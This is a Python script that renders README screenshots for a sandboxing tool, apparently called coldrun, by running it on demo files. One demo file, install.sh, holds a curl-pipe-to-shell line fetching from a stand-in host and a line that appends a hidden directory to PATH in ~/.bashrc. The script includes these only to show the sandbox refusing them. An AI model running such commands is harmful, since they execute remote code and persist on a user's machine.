"""Render the README screenshots from real coldrun runs.

Each shot runs coldrun in a scratch directory with colour forced on, then draws
the captured output with Rich's SVG export in the project's style (the logo's
dark background and blue accent, Iosevka, no fake window buttons) and converts
it to PNG with rsvg-convert. Needs bubblewrap, uv and network access.

    uv run python scripts/screenshots.py
"""

from __future__ import annotations

import io
import os
import re
import shutil
import subprocess
import sys
import tempfile
from pathlib import Path

from rich.console import Console
from rich.terminal_theme import TerminalTheme
from rich.text import Text

OUT = Path(__file__).resolve().parents[1] / "docs" / "assets" / "screenshots"
COLUMNS = 92
ACCENT = "#4cc2ff"  # the cursor in docs/assets/logo.svg
FONT = '"IosevkaTerm Nerd Font", "Iosevka Term", "Iosevka", monospace'

THEME = TerminalTheme(
    (13, 17, 23),
    (201, 209, 217),
    [
        (72, 79, 88), (255, 123, 114), (63, 185, 80), (210, 153, 34),
        (88, 166, 255), (188, 140, 255), (57, 197, 207), (177, 186, 196),
    ],
    [
        (110, 118, 129), (255, 161, 152), (86, 211, 100), (227, 179, 65),
        (121, 192, 255), (210, 168, 255), (86, 212, 221), (240, 246, 252),
    ],
)  # fmt: skip

DEMO = {
    "poc.py": '''#!/usr/bin/env python3
"""Proof of concept for a made-up CVE. It only prints."""
import argparse

import requests
import yaml
from bs4 import BeautifulSoup

args = argparse.ArgumentParser()
args.add_argument("--target")
target = args.parse_args().target
print(f"[*] target {target}")
libs = f"requests {requests.__version__}, PyYAML {yaml.__version__}"
print(f"[*] {libs}, {BeautifulSoup.__name__} ready")
print("[+] dry run finished, no packets sent")
''',
    # synthetic: refused before it runs, and example.invalid cannot resolve anyway
    "install.sh": """#!/bin/sh
# "one-line installer" pasted from a random gist
curl -fsSL https://example.invalid/setup.sh | sh
echo 'export PATH=$HOME/.local/.x:$PATH' >> ~/.bashrc
""",
    "fetch.sh": """#!/bin/sh
printf 'api.github.com  '
curl -sf -o /dev/null https://api.github.com/zen && echo reachable
printf 'example.com     '
curl -sf -o /dev/null https://example.com/ && echo reachable || echo blocked by coldrun
""",
}

#: (file name, command); a name ending in "+" runs once first, so the shot shows a warm cache
SHOTS = [
    ("run+", "coldrun run ./poc.py -- --target 10.10.11.5"),
    ("refused", "coldrun run ./install.sh"),
    ("allow-host", "coldrun run ./fetch.sh --allow-host api.github.com:443"),
    ("doctor", "coldrun doctor"),
]

CHAR_HEIGHT = 20  # Rich's export default
ASPECT = 0.5  # Iosevka is half as wide as it is tall
_TEXT = re.compile(
    r'(<text [^>]*?x=")([\d.]+)("[^>]*?textLength=")([\d.]+)("[^>]*>)'
    r"((?:&#160;)*)([^<]*?)((?:&#160;)*)</text>"
)

FORMAT = (
    re.sub(
        r"@font-face \{\{.*?\}\}\s*",
        "",
        Console.export_svg.__kwdefaults__["code_format"],
        flags=re.DOTALL,
    )
    .replace("font-family: Fira Code, monospace;", f"font-family: {FONT};")
    .replace(
        "font-size: 18px;\n        font-weight: bold;\n        font-family: arial;",
        f"font-size: 14px;\n        font-family: {FONT};\n        fill: #6e7681;",
    )
)


def capture(command: str, workdir: Path, cache: Path) -> str:
    """Run ``command`` (``coldrun ...``) and return its coloured output."""
    env = dict(
        os.environ,
        FORCE_COLOR="1",
        COLUMNS=str(COLUMNS),
        TERM="xterm-256color",
        XDG_CACHE_HOME=str(cache),
    )
    env.pop("NO_COLOR", None)
    argv = [sys.executable, "-m", "coldrun", *command.split()[1:]]
    res = subprocess.run(  # noqa: S603 - our own CLI on our own demo files
        argv, cwd=workdir, env=env, capture_output=True, text=True, check=False, timeout=600
    )
    out = res.stdout + res.stderr  # the script's output, then coldrun's report
    out = out.replace(str(cache), "~/.cache").replace(str(workdir), ".")
    return out.replace(str(Path.home()), "~")


def _lift_spaces(match: re.Match[str]) -> str:
    """Turn leading and trailing spaces into position and length; rsvg-convert drops them."""
    head, x, mid, length, tag, lead, text, tail = match.groups()
    width = CHAR_HEIGHT * ASPECT
    n_lead, n_tail = len(lead) // len("&#160;"), len(tail) // len("&#160;")
    if not text:
        return ""
    new_x = float(x) + n_lead * width
    new_len = float(length) - (n_lead + n_tail) * width
    return f"{head}{new_x:g}{mid}{new_len:g}{tag}{text}</text>"


def render(name: str, command: str, output: str) -> None:
    """Write ``name``.svg and ``name``.png into the screenshots folder."""
    body = Text.from_ansi(output.rstrip("\n"))
    # coldrun already laid the output out for COLUMNS; draw it as is, never re-wrap
    width = max(COLUMNS, *(len(line) for line in body.plain.splitlines()))
    console = Console(
        record=True, width=width, file=io.StringIO(), force_terminal=True, color_system="truecolor"
    )
    prompt = Text("$ ", style="#6e7681")
    prompt.append(command, style=f"bold {ACCENT}")
    console.print(prompt)
    console.print(body, soft_wrap=True)
    svg = console.export_svg(
        title=command, theme=THEME, code_format=FORMAT, font_aspect_ratio=ASPECT
    )
    svg = _TEXT.sub(_lift_spaces, svg)
    svg = re.sub(r'<g transform="translate\(26,22\)">.*?</g>', "", svg, flags=re.DOTALL)
    svg = svg.replace('stroke="rgba(255,255,255,0.35)"', 'stroke="#30363d"')
    (OUT / f"{name}.svg").write_text(svg)
    rsvg = shutil.which("rsvg-convert")
    if rsvg is None:
        sys.exit("rsvg-convert is needed: pacman -S librsvg or apt install librsvg2-bin")
    subprocess.run(  # noqa: S603 - fixed argv
        [rsvg, "--zoom=2", "-o", str(OUT / f"{name}.png"), str(OUT / f"{name}.svg")],
        check=True,
    )
    (OUT / f"{name}.svg").unlink()  # the PNG renders the same everywhere; the SVG does not
    sys.stdout.write(f"wrote {OUT / name}.png\n")


def main() -> None:
    """Capture and render every shot."""
    OUT.mkdir(parents=True, exist_ok=True)
    with tempfile.TemporaryDirectory(prefix="coldrun-demo-") as tmp:
        workdir, cache = Path(tmp) / "demo", Path(tmp) / "cache"
        workdir.mkdir()
        for file, body in DEMO.items():
            (workdir / file).write_text(body)
            (workdir / file).chmod(0o755)
        for name, command in SHOTS:
            if name.endswith("+"):
                capture(command, workdir, cache)
            render(name.rstrip("+"), command, capture(command, workdir, cache))


if __name__ == "__main__":
    main()
